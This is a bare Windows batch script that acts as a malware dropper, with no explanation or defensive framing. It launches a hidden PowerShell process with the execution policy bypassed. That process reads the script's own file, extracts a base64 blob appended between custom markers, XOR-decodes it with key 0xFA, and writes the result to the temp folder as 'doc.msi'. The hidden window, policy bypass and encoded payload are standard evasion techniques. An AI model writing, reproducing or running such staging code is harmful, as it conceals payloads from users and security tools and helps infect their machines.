@echo off
set "stage=%TEMP%\abcdefgh"
mkdir "%stage%" 2>nul
powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "$f=Get-Content -Raw '%~f0';$i=$f.LastIndexOf('<<<aabbccddeeff0011>>>');$j=$f.LastIndexOf('<<<1100ffeeddccbbaa>>>');$b=$f.Substring($i+22,$j-$i-22) -replace '\s','';$d=[Convert]::FromBase64String($b);$m=[Array]::ConvertAll($d,[System.Converter[byte,byte]]{param($x)$x -bxor 0xFA});$p=$env:TEMP+'\abcdefgh\doc.msi';[IO.File]::WriteAllBytes($p,$m)"
timeout /t 2 >nul
exit /b
<<<aabbccddeeff0011>>>
KjXrGltL4Buon4qIn4mflI6bjpOMn9qTlJ+IjtqTlImOm5aWn4janpuOmw==
<<<1100ffeeddccbbaa>>>
